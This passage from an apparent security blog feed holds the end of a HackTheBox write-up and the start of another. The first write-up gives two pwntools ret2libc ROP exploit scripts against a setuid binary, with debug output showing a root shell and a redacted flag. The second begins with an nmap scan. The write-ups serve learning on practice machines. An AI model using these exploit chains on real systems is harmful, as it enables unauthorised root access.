&lt;span class="code-line"&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;glibc offset: &lt;/span&gt;&lt;span class="si"&gt;%x&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_sys&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x46ff0&lt;/span&gt; &lt;span class="c1"&gt;# local&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_sys&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x4f440&lt;/span&gt; &lt;span class="c1"&gt;# remote&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_sh&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x183cee&lt;/span&gt; &lt;span class="c1"&gt;# local&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_sh&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x1b3e9a&lt;/span&gt; &lt;span class="c1"&gt;# remote&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;setuid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_setuid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xc8ac0&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# local&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_setuid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xe5970&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# remote&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sys&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;libc_sys&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;libc_sh&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;setuid&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;libc_setuid&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sh&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The output of the script give us a root shell on the machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kalili:~# python exploitR.py&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Connecting to 10.10.10.139 on port 22: Done&lt;/span&gt;
&lt;span class="code-line"&gt;[*] margo@10.10.10.139:&lt;/span&gt;
&lt;span class="code-line"&gt;    Distro    Ubuntu 18.04&lt;/span&gt;
&lt;span class="code-line"&gt;    OS:       linux&lt;/span&gt;
&lt;span class="code-line"&gt;    Arch:     amd64&lt;/span&gt;
&lt;span class="code-line"&gt;    Version:  4.15.0&lt;/span&gt;
&lt;span class="code-line"&gt;    ASLR:     Enabled&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Starting remote process &amp;#39;/usr/bin/garbage&amp;#39; on 10.10.10.139: pid 3704&lt;/span&gt;
&lt;span class="code-line"&gt;[DEBUG] Sent 0xa9 bytes:&lt;/span&gt;
&lt;span class="code-line"&gt;    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│&lt;/span&gt;
&lt;span class="code-line"&gt;    *&lt;/span&gt;
&lt;span class="code-line"&gt;    00000080  41 41 41 41  41 41 41 41  9b 17 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│&lt;/span&gt;
&lt;span class="code-line"&gt;    00000090  28 40 40 00  00 00 00 00  50 10 40 00  00 00 00 00  │(@@·│····│P·@·│····│&lt;/span&gt;
&lt;span class="code-line"&gt;    000000a0  19 16 40 00  00 00 00 00  0a                        │··@·│····│·│&lt;/span&gt;
&lt;span class="code-line"&gt;    000000a9&lt;/span&gt;
&lt;span class="code-line"&gt;[DEBUG] Received 0x17 bytes:&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;Enter access password: &amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;[DEBUG] Received 0x2e bytes:&lt;/span&gt;
&lt;span class="code-line"&gt;    00000000  0a 61 63 63  65 73 73 20  64 65 6e 69  65 64 2e 0a  │·acc│ess │deni│ed.·│&lt;/span&gt;
&lt;span class="code-line"&gt;    00000010  c0 59 74 0f  f5 7f 0a 45  6e 74 65 72  20 61 63 63  │·Yt·│···E│nter│ acc│&lt;/span&gt;
&lt;span class="code-line"&gt;    00000020  65 73 73 20  70 61 73 73  77 6f 72 64  3a 20        │ess │pass│word│: │&lt;/span&gt;
&lt;span class="code-line"&gt;    0000002e&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Leaked puts@GLIBC: �Yt\x0f�&lt;/span&gt;
&lt;span class="code-line"&gt;[*] glibc offset: 7ff50f6c5000&lt;/span&gt;
&lt;span class="code-line"&gt;[DEBUG] Sent 0xb9 bytes:&lt;/span&gt;
&lt;span class="code-line"&gt;    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│&lt;/span&gt;
&lt;span class="code-line"&gt;    *&lt;/span&gt;
&lt;span class="code-line"&gt;    00000080  41 41 41 41  41 41 41 41  9b 17 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│&lt;/span&gt;
&lt;span class="code-line"&gt;    00000090  00 00 00 00  00 00 00 00  70 a9 7a 0f  f5 7f 00 00  │····│····│p·z·│····│&lt;/span&gt;
&lt;span class="code-line"&gt;    000000a0  9b 17 40 00  00 00 00 00  9a 8e 87 0f  f5 7f 00 00  │··@·│····│····│····│&lt;/span&gt;
&lt;span class="code-line"&gt;    000000b0  40 44 71 0f  f5 7f 00 00  0a                        │@Dq·│····│·│&lt;/span&gt;
&lt;span class="code-line"&gt;    000000b9&lt;/span&gt;
&lt;span class="code-line"&gt;[DEBUG] Received 0x12 bytes:&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;\n&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;access denied.\n&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;# &amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Switching to interactive mode&lt;/span&gt;
&lt;span class="code-line"&gt;# $ id&lt;/span&gt;
&lt;span class="code-line"&gt;[DEBUG] Sent 0x3 bytes:&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;id\n&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;[DEBUG] Received 0x31 bytes:&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;uid=0(root) gid=1002(margo) groups=1002(margo)\n&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;# &amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=1002(margo) groups=1002(margo)&lt;/span&gt;
&lt;span class="code-line"&gt;# $ cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;[DEBUG] Sent 0x13 bytes:&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;cat /root/root.txt\n&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;[DEBUG] Received 0x23 bytes:&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;1cc73&amp;lt;redacted&amp;gt;\n&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;    &amp;#39;# &amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;1cc73&amp;lt;redacterd&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;What a journey! Exploiting this buffer overflow allow me to learn a lot about
&lt;a href="http://pwntools.com"&gt;pwntools&lt;/a&gt;. The binary manipulation is a bit strange as
here is no need to wait for the &lt;code&gt;garbage&lt;/code&gt; binary to ask for the password. But
the possibility to exploit a remote binary so easily is something precious.&lt;/p&gt;
&lt;h2 id="automated-pwn"&gt;Automated pwn&lt;/h2&gt;
&lt;p&gt;We can also use &lt;a href="http://pwntools.com"&gt;pwntools&lt;/a&gt; to fully automate the exploit
and make it compute the addresses automatically:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./garbage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;setuid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DEBUG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;elf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./garbage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;rop&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ROP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;rop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;regs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;rdi&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;order&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;regs&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;rop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;got&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;rop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;main&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ROP chains:&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dump&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;junk&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;136&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rop&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# wait until break line&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# wait until access denied&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;()[:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ljust&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;leaked puts: &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;u64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;rop2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ROP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;rop2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;next&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ROP2: &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rop2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dump&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rop2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# wait until break line&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# wait until access denied&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;But this won't "fully" work as the SUID part is not in it.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="buffer overflow"></category><category term="ROP"></category><category term="ret2libc"></category><category term="linux"></category></entry><entry><title>HTB: Writeup</title><link href="https://maggick.fr/2019/10/htb-writeup.html" rel="alternate"></link><published>2019-10-12T21:52:00+02:00</published><updated>2019-10-12T21:52:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2019-10-12:/2019/10/htb-writeup.html</id><summary type="html">&lt;p&gt;&lt;img alt="Writeup Card" class="align-left" src="/media/2019.10/writeup_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/192"&gt;Writeup&lt;/a&gt;.
(&lt;em&gt;Yes the machine name is writeup, searching a writeup for writeup will be a
funny thing.&lt;/em&gt;).
The machine is classed as an easy one. It involves vulnerability in a known CMS
as well as "PATH vulnerability" for the privilege escalation.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2019.10/writeup_card.png" alt="Writeup Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/192"&gt;Writeup&lt;/a&gt;.
(&lt;em&gt;Yes the machine name is writeup, searching a writeup for writeup will be a
funny thing.&lt;/em&gt;).
The machine is classed as an easy one. It involves vulnerability in a known CMS
as well as "PATH vulnerability" for the privilege escalation.&lt;/p&gt;


&lt;div class="toc"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#recon"&gt;Recon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#web-getting-user"&gt;Web, getting user&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#root"&gt;Root&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#wrapping-up"&gt;Wrapping up&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;p&gt;First of all we start by scanning the machine's open ports with nmap. Only port
22 (SSH) and 80 (HTTP) are open:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Sun Sep 22 16:08:28 2019 as: nmap -oA nmap -sSV 10.10.10.138&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.138&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.089s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 998 filtered ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)&lt;/span&gt;
